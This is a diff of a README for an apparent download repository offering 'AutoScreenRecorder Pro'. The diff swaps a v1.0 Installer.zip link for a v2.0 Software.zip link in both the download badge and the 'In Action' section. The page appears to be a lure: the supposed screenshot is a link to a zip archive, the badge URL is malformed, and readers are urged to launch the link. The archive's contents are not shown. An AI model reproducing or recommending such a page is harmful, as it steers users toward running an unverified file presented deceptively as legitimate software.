@@ -6,7 +6,7 @@
 ---
 
 ### 🚀 Download AutoScreenRecorder Pro Now! 
-[![Download AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip%20Here-blue)](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip)
+[![Download AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v2.0/Software.zip%20Here-blue)](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v2.0/Software.zip)
 #### Please note: The link needs to be launched to start the download.
 
 ---
@@ -43,7 +43,7 @@ Are you ready to explore the world of AutoScreenRecorder Pro? Click on the badge
 ## 📷 In Action:
 Take a look at AutoScreenRecorder Pro in action with these snapshots:
 
-![AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip)
+![AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v2.0/Software.zip)
 
 ---
 
